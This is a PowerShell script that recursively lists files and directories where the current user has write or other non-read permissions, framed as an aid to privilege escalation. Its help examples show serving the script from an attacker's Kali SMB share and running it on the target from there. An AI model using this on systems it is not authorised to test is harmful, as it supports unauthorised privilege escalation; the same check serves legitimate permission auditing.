<#
    .SYNOPSIS
    Find directories and files with interesting permissions that may aid privilege escalation.

    .PARAMETER SearchPath
    The directory to recursively get ACLs for files and folders.

    .PARAMETER JsonOutput
    Specifies if the PowerShell objects should be converted to JSON output.

    .INPUTS
    None. 
    
    .OUTPUTS
    System.Object

    .EXAMPLE
    PS> .\Find-FileAccess.ps1

    .EXAMPLE
    PS> .\Find-FileAcces.ps1 -SearchPath 'C:\Users'

    .EXAMPLE
    PS> .\Find-FileAccess.ps1 -SearchPath 'C:\inetpub' -JsonOutput:$true

    .EXAMPLE
    PS> .\Find-FileAccess.ps1 -SearchPath 'C:\Windows\Temp' -Hidden:$true 

    .EXAMPLE
    ...
    sudo impacket-smbserver -smb2support -username smb -password smb myshare .

    PS> New-SmbMapping -LocalPath Z: -RemotePath \\kali-ip-address\myshare -UserName smb -Password smb

    PS> $job = Start-Job -FilePath Z:\Find-FileAccess.ps1 -ArgumentList 'C:\Users', $false, $true
    PS> $results = $job | Receive-Job
    PS> $results
#>
[CmdletBinding()]
Param (
    [Parameter(Position = 0)]
    [ValidateNotNullOrEmpty()]
    [String]$SearchPath = $PWD.Path,

    [Parameter(Position = 1)]
    [Bool]$HiddenItems = $false,

    [Parameter(Position = 2)]
    [Bool]$JsonOutput = $false
)
begin {
    if (-not ([System.IO.Directory]::Exists($SearchPath))) { 
        throw "Please proivde a valid directory"
    }
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $currentUserName = $currentUser.Name
    $currentUserGroups = $currentUser.Groups
    $currentUserGroupNames = $currentUserGroups | ForEach-Object {
        $group = $_
        $group.Translate([System.Security.Principal.NTAccount]).Value
    }
    $whoamiGroups = whoami /groups /fo csv | ConvertFrom-Csv | Select-Object -Expand 'Group Name'
    $currentUserGroupNames += $whoamiGroups | Where-Object {$_ -notin $currentUserGroupNames}
    [String[]]$fileAccessRightsEnum = [System.Enum]::GetValues([System.Security.AccessControl.FileSystemRights])
    $interestingAccess = $fileAccessRightsEnum | Where-Object {$_ -notlike 'Read*' }
}
process {
    $gciParameters = @{
        Path = $SearchPath
        Recurse = $true
        ErrorAction = 'SilentlyContinue'
    }
    if ($HiddenItems) { $gciParameters.Add('Hidden', $true) }
    $acls = Get-ChildItem @gciParameters | ForEach-Object {
        try {
            Get-Acl $_.FullName
        }
        catch {
            # Silence error output
        }
    }
    $interestingAcls = $acls | ForEach-Object {
        $currentAcl = $_
        $identities = $currentAcl.Access.IdentityReference
        $identities | ForEach-Object {
            $currentIdentity = $_
            $identityString = $currentIdentity.ToString()
            if ($identityString -in $currentUserName -or $identityString -in $currentUserGroupNames) {
                $aclIdentityIndex = $currentAcl.Access.IdentityReference.IndexOf($currentIdentity)
                $identityAclAccess = $currentAcl.Access[$aclIdentityIndex]
                $fileSystemRights = $identityAclAccess.FileSystemRights.ToString() -split ',' -replace ' '
                if ($fileSystemRights -in $interestingAccess) {
                    [PSCustomObject]@{
                        'Path' = $currentAcl.Path -split '\:\:' | Select-Object -Index 1
                        'Permissions' = $currentAcl.Access[$aclIdentityIndex].IdentityReference.ToString() + ' ' + $currentAcl.Access[$aclIdentityIndex].FileSystemRights.ToString()
                    }
                }
            }
        }
    }
}
end {
    if ($interestingAcls) {
        if ($jsonOutput) {
            $interestingAcls | ConvertTo-Json -Depth 100
        }
        else {
            $interestingAcls | Format-Table -AutoSize -Wrap
        }
    }
    else {
        return
    }
}
